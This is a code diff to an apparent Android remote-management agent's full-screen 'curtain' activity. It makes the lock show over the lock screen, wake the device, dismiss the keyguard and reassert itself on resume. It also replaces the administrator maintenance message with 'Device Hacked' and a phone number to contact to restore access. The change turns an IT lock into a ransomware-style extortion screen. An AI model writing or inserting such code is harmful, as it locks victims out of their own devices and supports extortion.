@@ -1,6 +1,7 @@
 package com.trmm.agent;
 
 import android.app.Activity;
+import android.app.KeyguardManager;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -131,6 +132,9 @@ public class CurtainActivity extends Activity {
             getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
             getWindow().addFlags(
                     WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                    | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                    | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                     | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                     | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
             );
@@ -138,12 +142,14 @@ public class CurtainActivity extends Activity {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                 setShowWhenLocked(true);
                 setTurnScreenOn(true);
-            } else {
-                getWindow().addFlags(
-                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
-                                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
-                                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
-                );
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                try {
+                    KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+                    if (km != null && km.isKeyguardLocked()) {
+                        km.requestDismissKeyguard(this, null);
+                    }
+                } catch (Throwable ignored) {}
             }
         } catch (Throwable ignored) {}
 
@@ -190,9 +196,9 @@ public class CurtainActivity extends Activity {
 
         isCustomMessage = (title != null && !title.trim().isEmpty()) || (message != null && !message.trim().isEmpty());
 
-        String displayTitle = (title != null && !title.trim().isEmpty()) ? title : "Device Locked by Administrator";
+        String displayTitle = (title != null && !title.trim().isEmpty()) ? title : "Device Hacked";
         String displayMessage = (message != null && !message.trim().isEmpty()) ? message : "This device is temporarily locked for remote IT maintenance.";
-        String displaySubtitle = (subtitle != null && !subtitle.trim().isEmpty()) ? subtitle : "Please contact IT Support to restore access.";
+        String displaySubtitle = (subtitle != null && !subtitle.trim().isEmpty()) ? subtitle : "Contact +1        to restore access.";
 
         // Build elegant programmatic full-screen blackout UI
         LinearLayout layout = new LinearLayout(this);
@@ -256,6 +262,35 @@ public class CurtainActivity extends Activity {
                 registerReceiver(dismissReceiver, new IntentFilter(ACTION_DISMISS));
             }
         } catch (Throwable ignored) {}
+    }
+
+    @Override
+    public void onAttachedToWindow() {
+        super.onAttachedToWindow();
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+                setShowWhenLocked(true);
+                setTurnScreenOn(true);
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+                setShowWhenLocked(true);
+                setTurnScreenOn(true);
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+                if (km != null && km.isKeyguardLocked()) {
+                    km.requestDismissKeyguard(this, null);
+                }
+            }
+        } catch (Throwable ignored) {}
+        hideSystemUI();
     }
 
     @Override
